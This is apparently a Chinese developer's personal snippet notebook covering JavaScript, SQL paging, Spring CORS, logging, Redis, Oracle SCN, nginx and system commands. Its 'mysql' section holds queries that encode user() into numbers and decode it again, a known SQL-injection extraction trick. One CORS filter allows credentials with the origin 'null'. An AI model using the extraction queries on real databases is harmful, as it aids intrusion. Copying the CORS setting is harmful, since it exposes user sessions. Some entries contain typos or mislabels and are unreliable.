    alert('浏览器不支持该属性值')
}

--------------------------------------------------------------------------------------
https://github.com/fa-ge/jQuery-is-out-of-date jquery语法替换
--------------------------------------------------------------------------------------
const server = 'hettp://123.123.123.123:2000';
const testParams = {
    'name': 'nameyese',
    'password': 'passwords'
}
function toUrl(url, params){
    let paramsArr = [];
    if (params) {
        Object.keys(params).forEach(item => {
            paramsArr.push(item + '=' + params[item]);
        })
        if (url.search(/\?/) === -1) {
            url += '?' + paramsArr.join('&');
        } else {
            url += '&' + paramsArr.join('&');
        }

    }
    console.log(url);
}

function GetQueryString(name)
{
     let reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
     let r = window.location.search.substr(1).match(reg);
     if(r!=null)return  unescape(r[2]); return null;
}

if(window.XMLHttpRequest){
  var oAjax=window.XMLHttpRequest
}else{
  var oAjax=new ActiveXObject('Microsoft.XMLHTTP');
}
--------------------------------------------------------------------------------------
MongoDB分页
上一批的最后一个document的_id。整个代码形似（groovy代码）：
if (docId) {
    batch = collection.find(['_id': ['$gt': docId]] as Document).limit(BATCH_SIZE)
} else {
    batch = collection.find().limit(BATCH_SIZE)
}
docId = batch[-1]['_id']

SELECT ...
  FROM ...
 WHERE ...
   AND id < ?last_seen_id
 ORDER BY id DESC
 FETCH FIRST 10 ROWS ONLY
这种分页方式被称为“seek method”

--------------------------------------------------------------------------------------
迭代arguments
function useCall() {
    [].forEach.call(arguments, function(val, key) {
        console.log(key, val)
    });
}
useCall('1', '2');
--------------------------------------------------------------------------------------
Array.prototype.forEach 只跳过不存在的元素
第二个参数改变回调函数里面的this指向
var coder = {
  name: 'Shock',
  friends: ['Rocky', 'Bob'],
  logHiToFriends:function(){
    'use strict'
    this.friends.forEach(function(friend){
      console.log(this.name+ ' say hi to '+ friend);
    },this)
  }
}
--------------------------------------------------------------------------------------
Math.round(x)等同于：
Math.floor(x + 0.5)
Math.round(-3.5) //-3

['1','2','3'].map(parseInt);
//[1, NaN, NaN]

['1','2','3'].map(function(x){return parseInt(x,10)});
//[1, 2, 3]
--------------------------------------------------------------------------------------
function isObject(value){
  return value === Object(value);
}
--------------------------------------------------------------------------------------
调小 TCP 协议的 time_wait 超时时间
操作系统默认 240 秒后，才会关闭处于 time_wait 状态的连接
etc/sysctl.conf 文件去修改该缺省值（秒）：
net.ipv4.tcp_fin_timeout = 30
--------------------------------------------------------------------------------------
dependency:resolve
mvn dependency:resolve 打印出已解决依赖的列表
mvn dependency:tree 打印整个依赖树
--------------------------------------------------------------------------------------
count(*)会统计值为 NULL 的行，而 count(列名)不会统计此列为 NULL 值的行
--------------------------------------------------------------------------------------
mysql varchar索引长度
KEY `idx1` (`d`(333))

主键索引、唯一索引、普通索引，而覆盖索引是一种查询的
一种效果，用 explain 的结果，extra 列会出现：using index
--------------------------------------------------------------------------------------
依赖slf4j
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
private static final Logger logger = LoggerFactory.getLogger(Abc.class);
--------------------------------------------------------------------------------------
避免重复打印日志
<logger name="com.taobao.ecrm.member.config" additivity="false">

logger.error(各类参数或者对象 toString + "_" + e.getMessage(), e);
--------------------------------------------------------------------------------------
newFixedThreadPool和newSingleThreadExecutor: 主要问题是堆积的请求处理队列可能会耗费非常大的内存，甚至OOM。
newCachedThreadPool和newScheduledThreadPool: 主要问题是线程数最大数是Integer.MAX_VALUE，可能会创建数量非常多的线程，甚至OOM
--------------------------------------------------------------------------------------
spring 4
@CrossOrigin
@CrossOrigin(origins = "http://domain2.com", maxAge = 3600)

@Configuration
@EnableWebMvc
public class WebConfig extends WebMvcConfigurerAdapter {
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("http://domain2.com")
            .allowedMethods("PUT", "DELETE")
            .allowedHeaders("header1", "header2", "header3")
            .exposedHeaders("header1", "header2")
            .allowCredentials(false).maxAge(3600);
    }
}
allowCredentials 是否允许cookie随请求发送

@Bean
public FilterRegistrationBean corsFilter() {
	UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
	CorsConfiguration config = new CorsConfiguration();
	config.setAllowCredentials(true);
  config.addAllowedOrigin("http://localhost:9000");
	config.addAllowedOrigin("null");
	config.addAllowedHeader("*");
	config.addAllowedMethod("*");
	source.registerCorsConfiguration("/**", config); // CORS 配置对所有接口都有效
	FilterRegistrationBean bean = newFilterRegistrationBean(new CorsFilter(source));
	bean.setOrder(0);
	return bean;
}

Spring Boot
<mvc:cors>
    <mvc:mapping path="/api/**"
        allowed-origins="http://domain1.com, http://domain2.com"
        allowed-methods="GET, PUT"
        allowed-headers="header1, header2, header3"
        exposed-headers="header1, header2" allow-credentials="false"
        max-age="123" />
    <mvc:mapping path="/resources/**"
        allowed-origins="http://domain1.com" />
</mvc:cors>

#允许向该服务器提交请求的URI，*表示全部允许，在SpringMVC中，如果设成*，会自动转成当前请求头中的Origin
Access-Control-Allow-Origin: ”http://localhost:3000“

#允许访问的头信息
Access-Control-Expose-Headers: "Set-Cookie"

#预检请求的缓存时间（秒），即在这个时间段里，对于相同的跨域请求不会再预检了
Access-Control-Max-Age: ”1800”

#允许Cookie跨域，在做登录校验的时候有用
Access-Control-Allow-Credentials: “true”

#允许提交请求的方法，*表示全部允许
Access-Control-Allow-Methods:GET,POST,PUT,DELETE,PATCH

--------------------------------------------------------------------------------------
(1) 蓝绿部署：不停止老版本，额外搞一套新版本，等测试发现新版本OK后，删除老版本。
(2) 滚动发布：按批次停止老版本实例，启动新版本实例。
(3) 灰度发布/金丝雀部署：不停止老版本，额外搞一套新版本，常常按照用户设置路由权重，
例如90%的用户维持使用老版本，10%的用户尝鲜新版本。不同版本应用共存，经常与A/B测试一起使用，用于测试选择多种方案
--------------------------------------------------------------------------------------
@JsonFilter("ID-TITLE")
class Article {
  private String id;
  private String title;
  private String content;
 // ... getter/setter
}

// Demo
class Demo {
  public void main(String args[]) {
    ObjectMapper mapper = new ObjectMapper();
    // SimpleBeanPropertyFilter.filterOutAllExcept("id,title")
    // 过滤除了 id,title 以外的所有字段，也就是序列化的时候，只包含 id 和 title
    mapper.setFilterProvider(new SimpleFilterProvider().addFilter("ID-TITLE",
                    SimpleBeanPropertyFilter.filterOutAllExcept("id,title")));

    String filterOut = mapper.writeValueAsString(new Article());

    mapper = new ObjectMapper();
    // SimpleBeanPropertyFilter.serializeAllExcept("id,title")
    // 序列化所有字段，但是排除 id 和 title，也就是除了 id 和 title之外，其他字段都包含进 json
    mapper.setFilterProvider(new SimpleFilterProvider().addFilter("ID-TITLE",
            SimpleBeanPropertyFilter.serializeAllExcept(filter.split("id,title"))));

    String serializeAll = mapper.writeValueAsString(new Article());

    System.out.println("filterOut:" + filterOut);
    System.out.println("serializeAll :" + serializeAll);
  }
}
https://my.oschina.net/u/2328699/blog/836727 Spring MVC 更灵活的控制 json 返回（自定义过滤字段）
spring mvc implements HandlerMethodReturnValueHandler{
boolean supportsReturnType(MethodParameter returnType);

void handleReturnValue(Object returnValue, MethodParameter returnType,
           ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception;
--------------------------------------------------------------------------------------
http://mp.weixin.qq.com/s/dthQGQRiV4EsNn8uZ1qP9Q netty 问题
--------------------------------------------------------------------------------------
SKU 的全称是 Stock Keeping Unit 库存单位
PKU 的全称是 Standard Product Unit 产品单元标准
PKU 是一个用于展示的抽象概念
而商品则是某个商家出售的某个 PKU，商品相对产品，数据层面增加了价格、促销活动、运费等信息
--------------------------------------------------------------------------------------
查看当前系统的总内存状态
free -m
--------------------------------------------------------------------------------------
function start () {
  cd $proc_dir
  ./startup.sh
  tail -300f /usr/local/logs/tomcat-business/$proc_name.log
}
tomcat的进程会成为shell脚本的子进程，这样的话，如过shell脚本停止的话，系统会自动杀掉tomcat进程导致tomcat down掉
--------------------------------------------------------------------------------------
char c = '\u000a';
char m = '\u0027';
\u000a和\u0027是特殊转义字符，Java对在字符串字面常量中的Unicode转义字符没有提供任何特殊处理。程序会直接按照原字符转换为它们所表示的字符
\u000a是一个LineFeed,即换行
\u0022是双引号的转义字
'\u0027'单引号
System.out.println("a\u0022.length()+\u0022b".length());
String str = "a".length()+"b";
--------------------------------------------------------------------------------------
结果输出在 http 19999 端口
java -javaagent:./file-leak-detector-1.8-jar-with-dependencies.jar=http=19999 -jar xxx.jar

http://file-leak-detector.kohsuke.org/ java文件泄漏检测 too many open files

java -jar path/to/file-leak-detector.jar 1500 threshold=200,strong
strong 代表的含义是把记录信息的应用变成强引用，防止被 GC 回收掉，不设置在内存不足时文件记录会丢失

612 是 java 服务的进程号，19999 是监听的 http 端口号
java -jar file-leak-detector-1.8-jar-with-dependencies.jar 612 http=19999
file-leak-detector 查找文件句柄泄露问题，就是用 JVM 提供的接口，
以 agent 方式 attach 进正在运行的 JAVA 进程，修改 FileStream 等类型的字节码，
在 open & close 文件时加入拦截操作，记录线程和堆栈，然后在 http 或者系统日志中输出记录。
最后通过这些信息查找是哪里导致的问题，然后做针对性的修复

--------------------------------------------------------------------------------------
mysql
select conv(hex(substr(user(),1 + (1-1) * 8, 8 * 1)), 16, 10);
8245931987826405219
select conv(hex(substr(user(),1 + (2-1) * 8, 8 * 2)), 16, 10);
107118236496756
select conv(hex(substr(user(),1 + (3-1) * 8, 8 * 3)), 16, 10);

select concat(unhex(conv(8245931987826405219,10,16)),unhex(conv(107118236496756,10,16)))

n的取值为1、2、3
select conv(hex(substr(user(),1 + (n-1) * 8, 8 * n)), 16, 10);
--------------------------------------------------------------------------------------
div采用div{pointer-events:none}即可让这个HTML元素（包括它的所有子孙元素）失去所有的事件响应。
鼠标焦点会直接无视它，click、mouseover等所有事件会穿透它到达它的下一级元素
--------------------------------------------------------------------------------------
https://my.oschina.net/liubingsmile/blog/786465 nredis-proxy 高性能Redis 服务中间件
--------------------------------------------------------------------------------------
设置包的日志等级
Level level = Level.toLevel(Level.DEBUG);
Logger logger = LogManager.getLogger(“package”);
logger.setLevel(level);

org.apache.log4j.Level targetLevel = org.apache.log4j.Level.toLevel(loggerbean.getLevel());
targetLogger.setLevel(targetLevel);


ch.qos.logback.classic.Level targetLevel = ch.qos.logback.classic.Level.toLevel(loggerbean.getLevel());
targetLogger.setLevel(targetLevel);

org.apache.logging.log4j.core.config.LoggerConfig loggerConfig = (org.apache.logging.log4j.core.config.LoggerConfig) logger;
org.apache.logging.log4j.Level targetLevel = org.apache.logging.log4j.Level.toLevel(loggerbean.getLevel());
loggerConfig.setLevel(targetLevel);
org.apache.logging.log4j.core.LoggerContext ctx = (org.apache.logging.log4j.core.LoggerContext) org.apache.logging.log4j.LogManager.getContext(false);
ctx.updateLoggers(); // This causes all Loggers to refetch information from their LoggerConfig.

设置全局日志等级
Level level = Level.toLevel(Level.DEBUG);
LogManager.getRootLogger().setLevel(level);
--------------------------------------------------------------------------------------
redis
object idletime a 查看当前键的空闲时间
scan + object idletime  命令批量查询哪些键长时间未被访问，找出长时间不访问的键进行清理降低内存占用

object
refcount 和 idletime 返回整数.
encoding 返回编码类型.
lpush mylist "Hello World"
object refcount mylist
redis> object encoding mylist
"ziplist"
redis> object idletime mylist

redis> set foo 1000
OK
redis> object encoding foo
"int"
redis> append foo bar
(integer) 7
redis> get foo
"1000bar"
redis> object encoding foo
"raw"

Redis存储的所有值对象在内部定义为redisObject结构体
1.type字段:表示当前对象使用的数据类型，Redis主要支持5种数据类型:string,hash,list,set,zset
2.encoding字段: 代表当前对象内部采用哪种数据结构实现
3.lru字段:记录对象最后一次被访问的时间 object idletime {key}命令空闲时间
4 refcount字段:记录当前对象被引用的次数，用于通过引用次数回收内存 object refcount {key}获取当前对象引用
当对象为整数且范围在[0-9999]时，Redis可以使用共享对象的方式来节省内存
5*ptr字段:与对象的数据内容相关 如果是整数直接存储数据，否则表示指向数据的指针
高并发写入场景中，在条件允许的情况下建议字符串长度控制在39字节以内，减少创建redisObject内存分配次数从而提高性能

降低Redis内存使用最直接的方式就是缩减键（key）和值（value）的长度
对象共享池指Redis内部维护[0-9999]的整数对象池
可以通过object refcount 命令查看对象引用数验证是否启用整数对象池技术

当设置maxmemory并启用LRU相关淘汰策略如:volatile-lru，allkeys-lru时，Redis禁止使用共享对象池

Redis之所以不支持编码回退，主要是数据增删频繁时，数据向压缩编码转换非常消耗CPU
list-max-ziplist-entries参数，这个参数用来决定列表长度在多少范围内使用ziplist编码
--------------------------------------------------------------------------------------
https://github.com/eishay/jvm-serializers/wiki jvm序列化对比
--------------------------------------------------------------------------------------
+ "<td>"
    + "<a href='javascript:updateType(\"" + msg.id + "\")'>修改</a>"
    + "<a href='javascript:deleteType(\"" + msg.id + "\")'>&nbsp;删除</a>"
+ "</td>"
--------------------------------------------------------------------------------------
css3手机端-比1px还细的线
-moz-transform:scale(1,0.1);
 -webkit-transform:scale(1,0.1);
 -o-transform:scale(1,0.1);
transform:scale(.5,0.1);
--------------------------------------------------------------------------------------
查询系统当前SCN两条命令
SQL> select current_scn from v$database;
SQL> select dbms_flashback.get_system_change_number from dual;

获得系统当前scn可能的最大值
select
to_char(
(
    (
        (
            (
                (
                    (
                        to_char(sysdate,'YYYY')-1988
                    )*12+
                to_char(sysdate,'mm')-1
                )*31+to_char(sysdate,'dd')-1
            )*24+to_char(sysdate,'hh24')
        )*60+to_char(sysdate,'mi')
    )*60+to_char(sysdate,'ss')
) * to_number('ffff','XXXXXXXX')/4,'XXXXXXXXXXXXXXXX') scn_hex
from dual

SCN: System Change Number
SCN是顺序递增的一个数字，在Oracle 中用来标识数据库的每一次改动，及其先后顺序

--------------------------------------------------------------------------------------
ssl_session_cache builtin:1000 shared:SSL:10m;
#Session Cache，将Session缓存到服务器，这可能会占用更多的服务器资源

ssl_session_tickets on;
#开启浏览器的Session Ticket缓存

ssl_session_timeout 10m;
#SSL session过期时间

ssl_session_cache shared:SSL:20m;
--------------------------------------------------------------------------------------
SET NAMES UTF8MB4
Statement statement = con.createStatement();
statement.executeQuery("SET NAMES UTF8MB4");
statement.close();
把数据库字段设置为utf8mb4编码
--------------------------------------------------------------------------------------
QPS: Queries per second 每秒的请求数目
PPS：Packets per second 每秒数据包数目
--------------------------------------------------------------------------------------
BlockingQueue
drainTo():一次性从BlockingQueue获取所有可用的数据对象（还可以指定获取数据的个数），
通过该方法，可以提升获取数据效率；不需要多次分批加锁或释放锁
queue.drainTo(drained, batchSize)
最多从此队列中移除给定数量的可用元素，并将这些元素添加到给定 collection 中

--------------------------------------------------------------------------------------
TCP BBR
TCP BBR是谷歌出品的TCP拥塞控制算法，可以起到单边加速TCP连接的效果，也就是不用客户端的配合
BBR 目的是要尽量跑满带宽, 并且尽量不要有排队的情况

cwnd 是普通的拥塞控制算法里最终要求得的一个值，用来控制发包速率。BBR 也要求到这个值，
但是它不是最主要的控制发包速率的变量，主要的变量是 pacing_rate

用了一种溢水原理的思想，来预判丢包率，调配发包速率
--------------------------------------------------------------------------------------
cmd >taskkill /? 
杀进程taskkill /im QQMusic.exe /f 
--------------------------------------------------------------------------------------
linux查看系统已经设置的别名
alias -p
--------------------------------------------------------------------------------------